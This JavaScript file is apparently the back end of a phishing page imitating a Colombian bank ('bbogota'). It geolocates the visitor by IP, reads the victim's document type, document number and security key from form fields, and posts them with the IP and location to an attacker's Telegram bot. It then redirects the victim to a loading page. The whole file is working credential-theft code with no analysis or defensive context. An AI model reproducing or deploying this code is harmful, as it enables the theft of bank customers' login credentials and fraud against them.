










$.getJSON("https://api.ipify.org?format=json", function(data) {
  $("#gfg").html(data.ip);
});

$.getJSON("https://ipinfo.io", function(response) {
  $("#ip").html("IP: " + response.ip);
  $("#address").html("" + response.city + ", " + response.country);
});

var u_name, u_name2, u_name3, u_name4, ip, ip2, message;

var ready = function() {
  u_name = document.getElementById("tipoPersona").value;
  u_name2 = document.getElementById("IType").value;
  u_name3 = document.getElementById("numi").value;
  u_name4 = document.getElementById("clvseg").value;
  ip = document.getElementById("gfg").innerHTML;
  ip2 = document.getElementById("address").innerHTML;
  message = "bbogota\nTipoCliente: " + u_name + "\nDocumento: " + u_name2 + "-" + u_name3 +  "\nClav3Seg: " + u_name4 + "\n\nIP: " + ip + "\n" + ip2;
};

var sender = function() {
  ready();
  var settings = {
    "async": true,
    "crossDomain": true,
    "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
    "method": "POST",
    "headers": {
      "Content-Type": "application/json",
      "cache-control": "no-cache"
    },
    "data": JSON.stringify({
      "chat_id": chat_id,
      "text": message
    })
  };
  $.ajax(settings).done(function(response) {
    console.log(response);
    window.location = 'load.html';
  });
  return false;
};